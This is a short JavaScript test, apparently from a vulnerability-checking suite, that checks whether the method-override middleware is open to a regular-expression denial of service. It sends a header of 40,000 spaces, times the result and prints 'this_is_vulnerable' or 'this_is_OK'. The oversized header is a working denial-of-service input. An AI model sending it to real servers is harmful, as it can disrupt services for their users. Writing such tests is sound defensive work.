// test("ReDos in method-override", () => {
  const methodOverride = require("method-override");
  const measureTime = require("../utils").measureTime;
  let t = measureTime(function () {
    let middleware = methodOverride();
    middleware(
      {
        headers: { "x-http-method-override": " ".repeat(40000) },
        method: "POST",
      },
      {
        getHeader: () => {
          return "";
        },
        setHeader: () => {},
      },
      () => {}
    );
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
